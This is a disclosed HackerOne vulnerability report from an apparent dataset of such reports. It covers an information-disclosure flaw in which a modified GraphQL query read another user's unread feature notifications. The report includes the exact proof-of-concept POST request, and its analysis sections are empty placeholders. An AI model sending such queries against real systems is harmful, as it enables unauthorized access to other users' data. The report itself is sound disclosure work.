---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '316810'
original_report_id: '316810'
title: Can read features from any user
weakness: Information Disclosure
team_handle: security
created_at: '2018-02-16T15:31:02.788Z'
disclosed_at: '2018-03-12T12:49:00.503Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Can read features from any user

## Metadata

- HackerOne Report ID: 316810
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2018-03-12T12:49:00.503Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
An attacker can read feature notifications from any user. 
Just need to change `me` to `user(username:"filedescriptor")` in your request to get the features.

### Steps To Reproduce

`POST /graphql HTTP/1.1
Host: hackerone.com
{"query":"query New_feature {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  user(username:\"filedescriptor\") {\n    id, username\n,  reputation,   new_feature_notification {\n      name,\n      description,\n      url,\n      id\n    }\n  },\n  id\n}","variables":{}}`

## Impact

An attacker can read unread features from any user and have to know how long this user did not visit the hackerone (as example). Probably in future you will make individual feature for individual user. 
So now it's a bug.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
